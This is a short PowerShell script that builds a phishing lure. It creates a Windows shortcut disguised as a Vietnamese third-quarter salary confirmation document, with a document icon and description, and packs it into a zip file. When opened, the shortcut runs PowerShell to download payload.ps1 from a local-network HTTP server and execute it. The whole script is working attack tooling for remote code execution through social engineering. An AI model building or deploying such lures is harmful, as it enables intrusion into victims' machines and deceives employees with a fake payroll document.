$web = Split-Path -Parent $MyInvocation.MyCommand.Path
$shortcutPath = Join-Path $web "ThongBaoLuong_Q3.lnk"
$zipPath = Join-Path $web "ThongBaoLuong_Q3.zip"

if (Test-Path -LiteralPath $shortcutPath) {
    Remove-Item -LiteralPath $shortcutPath -Force
}

if (Test-Path -LiteralPath $zipPath) {
    Remove-Item -LiteralPath $zipPath -Force
}

$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($shortcutPath)

$shortcut.TargetPath = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$shortcut.Arguments = '-NoProfile -Command "$x = Invoke-RestMethod ''http://192.168.141.1:8000/payload.ps1''; $sb = [ScriptBlock]::Create([string]$x); & $sb"'
$shortcut.WorkingDirectory = ""
$shortcut.WindowStyle = 1
$shortcut.IconLocation = "$env:SystemRoot\System32\shell32.dll,70"
$shortcut.Description = "Tài liệu xác nhận lương quý 3"
$shortcut.Save()

Compress-Archive -LiteralPath $shortcutPath -DestinationPath $zipPath -Force
Write-Host "Created $shortcutPath"
Write-Host "Created $zipPath"
